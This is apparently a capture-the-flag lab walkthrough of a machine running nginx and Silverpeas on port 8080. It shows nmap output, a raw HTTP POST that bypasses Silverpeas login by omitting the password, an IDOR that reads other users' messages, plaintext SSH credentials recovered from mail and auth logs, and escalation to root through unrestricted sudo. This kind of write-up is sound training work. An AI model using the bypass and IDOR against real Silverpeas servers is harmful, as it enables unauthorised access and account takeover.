## MACHINE IP
```bash
10.201.127.65
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Tue Oct  7 21:45:25 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.201.127.65
Nmap scan report for untitled.tld (10.201.127.65)
Host is up (0.30s latency).
Not shown: 65531 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d3:e7:b8:2d:17:2d:df:c1:7d:5a:01:5f:3e:31:00:8e (ECDSA)
|_  256 b9:16:15:55:ee:29:bc:b3:78:f0:54:1a:cc:5e:8e:ec (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Hack Smarter Security
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Tue, 07 Oct 2025 16:16:20 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Tue, 07 Oct 2025 16:16:18 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Tue, 07 Oct 2025 16:16:19 GMT
|_    <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|_http-title: Error
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=10/7%Time=68E53CD3%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r
SF:\nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Tue,\
SF:x2007\x20Oct\x202025\x2016:16:18\x20GMT\r\n\r\n<html><head><title>Error
SF:</title></head><body>404\x20-\x20Not\x20Found</body></html>")%r(HTTPOpt
SF:ions,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r\nCo
SF:ntent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Tue,\x200
SF:7\x20Oct\x202025\x2016:16:19\x20GMT\r\n\r\n<html><head><title>Error</ti
SF:tle></head><body>404\x20-\x20Not\x20Found</body></html>")%r(RTSPRequest
SF:,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConn
SF:ection:\x20close\r\n\r\n")%r(FourOhFourRequest,C9,"HTTP/1\.1\x20404\x20
SF:Not\x20Found\r\nConnection:\x20close\r\nContent-Length:\x2074\r\nConten
SF:t-Type:\x20text/html\r\nDate:\x20Tue,\x2007\x20Oct\x202025\x2016:16:20\
SF:x20GMT\r\n\r\n<html><head><title>Error</title></head><body>404\x20-\x20
SF:Not\x20Found</body></html>")%r(Socks5,42,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Gener
SF:icLines,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\
SF:r\nConnection:\x20close\r\n\r\n")%r(Help,42,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(SS
SF:LSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x
SF:200\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,42,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20
SF:close\r\n\r\n")%r(TLSSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Kerberos,42
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(SMBProgNeg,42,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(LPDStr
SF:ing,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nC
SF:onnection:\x20close\r\n\r\n")%r(LDAPSearchReq,42,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct  7 21:47:52 2025 -- 1 IP address (1 host up) scanned in 146.44 seconds

```
## OPEN PORTS - ANALYSIS
```bash
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
8080/tcp open  http-proxy
```
## RECON
```bash
# Operating System                  // Found Post Initial Enumeration
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04.3 LTS"
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy

# Credentials                        // Found Post Initial and Privesc Enum
tim:cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
tyler:_Zd_zx7N823/
```
## ENUMERATION
```bash
# Port 80 Enumeration
sudo whatweb -v $url
Summary   : Email[jane@untitled.tld], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], JQuery, nginx[1.18.0], Script

- add to /etc/hosts
10.201.127.65 untitled.tld

- Checking out page contents found few usernames

- Possible username
jane
1337est
scr1ptkiddy
Silverpeas

# Port 8080
- On access 404
- Fuzzing found /website/ - Forbidden
  
- Checking possible usernames as directory names on url 

- Foung login page
http://untitled.tld:8080/silverpeas/defaultLogin.jsp

- Google fu silverpeas exploit - found Authentication Bypass
# Source 
https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d

- Using Burpsuite
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: untitled.tld:8080
Content-Length: 49
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://untitled.tld:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://untitled.tld:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=1
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=sTIpPmRiMVChtGqSky0ywLPaMfWmpB2VnnX5fuTg.ebabc79c6d2a
Connection: keep-alive

Login=scr1ptkiddy&DomainId=0

- Able to bypass and login to silver peas

- Check notifications and saw the url
http://untitled.tld:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=5

- Trying IDOR
http://untitled.tld:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6
- Got creds
Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes. 
Username: tim
Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```
## INITIAL SHELL
```bash
# Using creds login to ssh
tim:cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```
## PRIVILEGE ESCALATION
```bash
- Run linpeas.sh found /var/log/auth files readable 
- Found creds 
tyler:_Zd_zx7N823/

su tyler
Password:_Zd_zx7N823/

tyler@ip-10-201-127-65:/$ sudo -l
[sudo] password for tyler: 
Matching Defaults entries for tyler on ip-10-201-127-65:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on ip-10-201-127-65:
    (ALL : ALL) ALL
```
## ROOT | ADMINISTRATOR - PWNED
```bash
tyler@ip-10-201-127-65:/var/log$ sudo su
root@ip-10-201-127-65:/var/log# id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-201-127-65:/var/log# whoami
root
```
